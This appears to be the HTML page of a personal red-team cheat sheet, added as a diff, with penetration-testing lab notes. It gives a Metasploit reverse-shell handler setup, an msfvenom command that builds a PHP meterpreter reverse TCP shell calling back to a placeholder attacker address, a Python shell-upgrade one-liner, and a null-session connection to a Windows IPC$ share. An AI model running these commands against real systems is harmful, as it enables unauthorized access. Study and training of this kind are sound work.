@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>/brainbox</title>
+ 
+
+  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul>
+      <li class="menu-first-child">
+        <span>
+          [cyberRat@RedTeam]~$
+          <span class="blink">
+            █
+          </span>
+        </span>
+      </li>
+      <li>
+        <a href="/">Home</a>
+      </li>
+
+    
+      <li>
+        <a href="/brainbox/">/BrainBox</a>
+      </li> 
+      <li>
+        <a href="/resume/">/Resume</a>
+      </li>
+
+    </ul>
+  </div>
+</header>
+
+<main>
+      <h2 id="metasploit">Metasploit</h2>
+<h4 id="-handlers">./ Handlers</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/multi/handler
+msf6 <span class="o">&gt;</span> <span class="nb">set </span>PAYLOAD &lt;Payload name&gt;
+msf6 <span class="o">&gt;</span> <span class="nb">set </span>LHOST &lt;LHOST value&gt;
+msf6 <span class="o">&gt;</span> <span class="nb">set </span>LPORT &lt;LPORT value&gt;
+msf6 <span class="o">&gt;</span> <span class="nb">set </span>ExitOnSession <span class="nb">false
+</span>msf6 <span class="o">&gt;</span> exploit <span class="nt">-j</span> <span class="nt">-z</span>
+</code></pre></div></div>
+<p><br />
+Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r’ 
+<br />
+<br /></p>
+
+<h4 id="-scripting-payloads">./ Scripting Payloads</h4>
+<p>PHP</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> php/meterpreter_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;your-IP-address&gt; <span class="nv">lport</span><span class="o">=</span>&lt;your-port-address&gt; <span class="nt">-o</span> shell.php
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="python">Python</h2>
+<h4 id="-spawn-a-terminal">./ Spawn a terminal</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span><span class="p">;</span>
+</code></pre></div></div>
+<details> 
+  <summary> <b>Checking for Null Sessions</b> </summary>
+
+To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.
+
+To connect, you have to type the following command in a Windows shell:
+
+```bash
+&gt; NET USE \\<target IP="" address="">\IPC$ '' /u:''
+```
+
+This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
+
+Let's try the command on our target:
+
+<br />
+<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%" />
+<br />
+
+
+The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
+  
+Example:
+<br />
+<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%" />
+<br />
+You can also perform the very same checks by using smbclient:
+<br />
+<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%" />
+&lt;/details&gt;
+</target></details>
+
+
+    </main><footer>
+  <a href="https://twitter.com/ratilovich">Twitter</a> 
+</footer>
+</div>
+  </body>
+</html>
